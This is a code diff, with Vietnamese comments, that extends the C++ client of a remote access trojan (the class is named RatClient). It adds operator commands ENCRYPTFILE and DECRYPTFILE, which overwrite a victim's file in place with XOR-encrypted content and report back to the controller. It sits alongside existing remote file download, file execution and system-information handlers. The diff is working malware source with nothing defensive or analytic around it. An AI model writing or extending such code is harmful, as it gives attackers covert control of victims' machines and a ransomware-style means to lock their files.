@@ -93,6 +93,11 @@ public:
     void HandleCreateFile(const std::string& filename);
     void HandleDownload(const std::string& filename);
     void HandleDownloadDir(const std::string& foldername);
+    void HandleEncryptFile(const std::string& args);
+    void HandleDecryptFile(const std::string& args);
+
+private:
+    bool ProcessFileXOR(const std::string& filename, const std::string& key);
 };
 
 // Hàm xử lý lệnh LIST (Liệt kê file)
@@ -340,6 +345,73 @@ void FileManager::HandleRunFile(const std::string& filepath) {
     client.stringSend(statusMsg);
     std::cout << "[+] Thuc hien RUNFILE " << filepath << ": " << statusMsg << "\n";
 }
+
+// Hàm bổ trợ thực hiện XOR dữ liệu file
+bool FileManager::ProcessFileXOR(const std::string& filename, const std::string& key) {
+    if (key.empty() || !fs::exists(filename) || fs::is_directory(filename)) {
+        return false;
+    }
+
+    // Đọc toàn bộ file vào bộ nhớ
+    std::ifstream inFile(filename, std::ios::binary);
+    if (!inFile.is_open()) return false;
+
+    std::vector<char> buffer((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
+    inFile.close();
+
+    // Mã hóa / Giải mã bằng XOR
+    for (size_t i = 0; i < buffer.size(); ++i) {
+        buffer[i] ^= key[i % key.length()];
+    }
+
+    // Ghi đè lại nội dung đã xử lý vào file
+    std::ofstream outFile(filename, std::ios::binary | std::ios::trunc);
+    if (!outFile.is_open()) return false;
+
+    outFile.write(buffer.data(), buffer.size());
+    outFile.close();
+    return true;
+}
+
+// Xử lý lệnh ENCRYPTFILE
+void FileManager::HandleEncryptFile(const std::string& args) {
+    std::stringstream ss(args);
+    std::string filename, key;
+    ss >> filename >> key;
+
+    std::string statusMsg;
+    if (filename.empty() || key.empty()) {
+        statusMsg = "ERROR: Cu phap khong hop le. Cu phap: ENCRYPTFILE <filename> <key>\n";
+    } else if (ProcessFileXOR(filename, key)) {
+        statusMsg = "SUCCESS: Da ma hoa file '" + filename + "' thanh cong.\n";
+    } else {
+        statusMsg = "ERROR: Khong the ma hoa file (Kiem tra file ton tai hoac quyen truy cap).\n";
+    }
+
+    client.stringSend(statusMsg);
+    std::cout << "[+] Thuc hien ENCRYPTFILE " << filename << ": " << statusMsg;
+}
+
+// Xử lý lệnh DECRYPTFILE
+void FileManager::HandleDecryptFile(const std::string& args) {
+    std::stringstream ss(args);
+    std::string filename, key;
+    ss >> filename >> key;
+
+    std::string statusMsg;
+    if (filename.empty() || key.empty()) {
+        statusMsg = "ERROR: Cu phap khong hop le. Cu phap: DECRYPTFILE <filename> <key>\n";
+    } else if (ProcessFileXOR(filename, key)) {
+        statusMsg = "SUCCESS: Da giai ma file '" + filename + "' thanh cong.\n";
+    } else {
+        statusMsg = "ERROR: Khong the giai ma file (Kiem tra file ton tai hoac quyen truy cap).\n";
+    }
+
+    client.stringSend(statusMsg);
+    std::cout << "[+] Thuc hien DECRYPTFILE " << filename << ": " << statusMsg;
+}
+
+
 
 class ProcessManager {
 public:
@@ -589,6 +661,14 @@ void RatClient::HandleCommand(const std::string& command) {
     }
     else if (command == "SYSINFO") {
         systemInfo.HandleSysInfo();
+    }
+    else if (command.rfind("ENCRYPTFILE ", 0) == 0) {
+        std::string args = command.substr(12);
+        fileManager.HandleEncryptFile(args);
+    }
+    else if (command.rfind("DECRYPTFILE ", 0) == 0) {
+        std::string args = command.substr(12);
+        fileManager.HandleDecryptFile(args);
     }
 }
 
